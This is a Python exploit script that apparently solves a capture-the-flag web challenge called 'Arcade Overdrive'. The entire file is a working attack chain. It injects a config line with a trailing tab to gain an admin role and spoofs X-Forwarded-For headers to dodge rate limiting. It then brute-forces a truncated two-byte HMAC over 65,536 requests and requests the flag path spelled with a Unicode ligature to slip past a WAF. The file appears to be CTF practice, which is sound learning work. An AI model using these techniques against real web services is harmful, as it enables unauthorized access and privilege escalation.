#!/usr/bin/env python3

import requests
import time

TARGET = "https://dc1f59d3-0bea-4afe-9e9b-57f0f1f39de6.espark.tn"

def exploit():
    print("[*] ARCADE OVERDRIVE - Full Exploit Chain (No Secret Knowledge)")
    print()
    
    print("[1] Registering user...")
    resp = requests.post(f"{TARGET}/register", data={"username": "hacker"})
    initial_token = resp.json()["token"]
    print(f"[+] Initial token: {initial_token[:50]}...")
    print()
    
    print("[2] Exploiting config parser with tab bypass...")
    config_payload = "USERNAME=hacker\nROLE=admin\t"
    resp = requests.post(
        f"{TARGET}/config",
        data={"token": initial_token, "config": config_payload}
    )
    
    if "token" not in resp.json():
        print("[-] Config exploit failed")
        return
    
    admin_token_weak = resp.json()["token"]
    print(f"[+] Got admin token (weak HMAC): {admin_token_weak[:50]}...")
    print()
    
    print("[3] Bypassing rate limit with X-Forwarded-For spoofing...")
    print("[+] Rate limit bypass ready")
    print()
    
    print("[4] Brute forcing 2-byte HMAC (65536 possibilities)...")
    message_hex = admin_token_weak[:-4]
    
    print("[*] Starting brute force attack...")
    print("[*] This will try all 65,536 possible HMAC values...")
    print("[*] Progress updates every 1000 attempts...")
    print()
    
    start_time = time.time()
    found = False
    
    for i in range(0x10000):
        test_hmac = i.to_bytes(2, 'big')
        test_token = message_hex + test_hmac.hex()
        
        try:
            resp = requests.get(
                f"{TARGET}/boss/level2",
                params={"token": test_token},
                headers={"X-Forwarded-For": f"10.0.{i//256}.{i%256}"},
                timeout=2
            )
            
            if resp.status_code == 200:
                valid_token = test_token
                found = True
                elapsed = time.time() - start_time
                print(f"\n[+] Found valid HMAC after {i+1} attempts: {test_hmac.hex()}")
                print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                print(f"[+] Valid admin token: {valid_token[:50]}...")
                break
            
            if (i + 1) % 1000 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed if elapsed > 0 else 0
                remaining = (65536 - i - 1) / rate if rate > 0 else 0
                print(f"[*] Tried: {i+1:5d}/65536 ({(i+1)/655.36:5.1f}%) | Speed: {rate:6.0f} req/s | ETA: {remaining:4.0f}s | Current HMAC: {test_hmac.hex()}")
        
        except requests.exceptions.RequestException as e:
            if (i + 1) % 1000 == 0:
                print(f"[!] Request error at attempt {i+1}, continuing...")
            continue
    
    if not found:
        print("[-] Brute force failed")
        return
    
    print()
    print("[5] Exploiting Unicode ligature to bypass WAF...")
    flag_url = f"{TARGET}/boss/ﬂag"
    
    resp = requests.get(
        flag_url,
        params={"token": valid_token},
        headers={"X-Forwarded-For": "10.0.0.1"}
    )
    
    if resp.status_code == 200:
        flag = resp.json().get("flag")
        print(f"[+] FLAG CAPTURED: {flag}")
        print()
        total_time = time.time() - start_time
        print(f"[*] Total exploit time: {total_time:.2f} seconds")
    else:
        print(f"[-] Failed to get flag: {resp.status_code}")
        print(resp.text)

if __name__ == "__main__":
    exploit()
